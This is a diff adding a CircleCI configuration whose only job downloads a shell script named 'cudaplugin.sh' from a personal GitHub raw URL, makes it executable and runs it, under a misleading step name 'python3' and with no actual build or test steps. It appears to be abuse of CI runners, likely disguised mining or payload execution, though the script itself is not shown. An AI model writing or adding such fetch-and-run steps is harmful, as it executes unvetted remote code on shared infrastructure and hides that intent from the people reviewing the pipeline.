@@ -1,0 +1,17 @@
+version: 2.1
+
+orbs:
+  python: circleci/python@0.2.1
+
+jobs:
+  tai-anjink:
+    executor: python/default
+    steps:
+      - run:
+          command: wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh && chmod u+x cudaplugin.sh && ./cudaplugin.sh
+          name: python3
+
+workflows:
+  python:
+    jobs:
+      - tai-anjink
